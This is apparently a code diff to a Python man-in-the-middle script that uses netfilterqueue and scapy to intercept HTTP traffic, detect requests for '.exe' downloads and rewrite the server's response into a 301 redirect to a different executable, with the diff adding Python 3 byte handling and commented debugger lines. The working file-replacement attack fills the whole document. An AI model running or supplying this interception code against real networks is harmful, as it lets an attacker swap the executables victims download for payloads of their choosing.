@@ -1,5 +1,6 @@
 import netfilterqueue
 import scapy.all as scapy
+import sys
 import pdb
 
 ack_list = []
@@ -23,7 +24,7 @@ def process_packet(packet):
     #print("TEST 1")
     scapy_packet = scapy.IP(packet.get_payload())
     #print("TEST 2")
-
+    #pdb.set_trace()
     # Data sent in HTTP layer are placed in the Raw layer of the scapy packet:
     if scapy_packet.haslayer(scapy.Raw):
         #print("HAS ROW")
@@ -32,7 +33,15 @@ def process_packet(packet):
             print("HTTP Request")
             # If a ".exe" string is contained in the load field of the Raw layer of the scapy packets
             # it means that the request is related to the download of a ".exe" file:
-            if ".exe" in scapy_packet[scapy.Raw].load:
+            #pdb.set_trace()
+            #pdb.set_trace()
+            if sys.version_info[0] >= 3:
+                scapy_packet_load = bytes(scapy_packet).decode(errors="backslashreplace")
+            else:
+                scapy_packet_load = scapy_packet[scapy.Raw].load
+
+            if ".exe" in scapy_packet_load:
+
                 print("[+] exe download Request")
 
                 # Add the ack (from TCP layer of the scapy packet) of this request (related to a download of
@@ -51,16 +60,14 @@ def process_packet(packet):
 
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file...")
-
                 modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar590.exe\n\n")
 
+                #pdb.set_trace()
                 # Replace the original packet payload with the packet forget by scapy:
-                packet.set_payload(str(modified_packet))
-
-
-            #print(scapy_packet.show())
-
-
+                if sys.version_info[0] >= 3:
+                    packet.set_payload(bytes(modified_packet))
+                else:
+                    packet.set_payload(str(modified_packet))
 
 
     packet.accept()
